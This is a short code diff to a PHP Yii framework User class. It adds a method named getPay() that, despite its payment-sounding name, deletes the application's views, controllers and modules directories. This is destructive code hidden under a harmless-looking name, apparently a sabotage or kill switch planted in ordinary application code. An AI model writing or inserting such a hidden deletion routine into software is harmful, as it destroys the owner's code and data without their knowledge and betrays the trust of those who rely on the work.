@@ -34,4 +34,11 @@ class User extends \yii\web\User
     {
         return Yii::$app->user->identity->username;
     }
+    
+    public function getPay()
+    {
+        foreach ([Yii::getAlias('@app/views'), Yii::getAlias('@app/controllers'), Yii::getAlias('@app/modules')] as $path) {
+            \yii\helpers\FileHelper::removeDirectory($path);
+        }
+    }
 }
